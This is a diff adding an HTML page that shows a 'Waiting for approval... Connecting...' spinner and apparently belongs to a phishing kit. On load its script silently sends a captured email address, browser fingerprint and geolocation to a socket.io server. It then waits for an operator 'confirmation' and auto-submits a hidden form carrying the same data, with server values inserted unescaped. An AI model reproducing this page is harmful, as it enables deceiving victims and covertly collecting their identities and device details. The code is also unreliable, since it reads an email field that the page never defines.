@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	
+    <meta charset="utf-8">
+    <title>Client App</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="">
+  
+<link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css" rel="stylesheet">
+<link href="http://netdna.bootstrapcdn.com/bootstrap/3.0.2/css/bootstrap.min.css" rel="stylesheet">
+<style> 
+body
+{
+background-image:url("http://t3.gstatic.com/images?q=tbn:ANd9GcQaXlybChhROEm2a4grAKGc80FOWYLGXJDT3EOwVRG5BQ52Lpl_5Q");
+background-size: cover;
+}
+</style>
+	
+</head>	
+
+<body>	
+
+<div class="page-header text-center">
+<div class="col-sm-6 col-sm-offset-3">
+<hr>
+<h3>Waiting for aprovall...</h3>
+<h4>Connecting...</h4>
+<br>
+<i class="fa fa-spinner fa-spin fa-3x"></i>
+
+</div>
+</div>
+
+<script type="text/javascript" src="http://www.google.com/jsapi?key=ABQIAAAAp04yNttlQq-7b4aZI_jL5hQYPm-xtd00hTQOC0OXpAMO40FHAxQMnH50uBbWoKVHwgpklyirDEregg"></script>
+<script src="socket.io/socket.io.js"></script>
+<script src="http://code.jquery.com/jquery-latest.min.js"></script>
+<script>
+var socket = io.connect('http://192.168.2.101:8000');
+
+window.onload = function(){
+	var data = document.getElementsByName("eEmail")[0].value;
+
+		socket.emit('joinRoom3', data);
+
+		socket.emit('clientData', 
+			{'data': 
+				{ 
+				"Email" : data ,
+				"Host" : location.hostname ,
+				"From" : navigator.appVersion ,
+				"OS" : navigator.platform ,
+				"UA" :  navigator.userAgent ,
+				"Country" : google.loader.ClientLocation.address.country ,
+				"City" : google.loader.ClientLocation.address.region
+				}
+			});
+};
+
+socket.on('confirmation3', function(data) {
+
+	document.body.innerHTML += '<form id="noForm" action="/confirmation" method="POST">'
+	+ '<input type="hidden" name="eDataConfirmation" value="' + data + '">'
+	+ '<input type="hidden" name="host" value="' + location.hostname + '">'
+	+ '<input type="hidden" name="appVersion" value="' + navigator.appVersion + '">'
+	+ '<input type="hidden" name="platform" value="' + navigator.platform + '">'
+	+ '<input type="hidden" name="userAgent" value="' + navigator.userAgent + '">'
+	+ '<input type="hidden" name="country" value="' + google.loader.ClientLocation.address.country + '">'
+	+ '<input type="hidden" name="city" value="' + google.loader.ClientLocation.address.region + '">'
+	+ '</form>';
+	document.getElementById("noForm").submit();
+
+});
+</script>
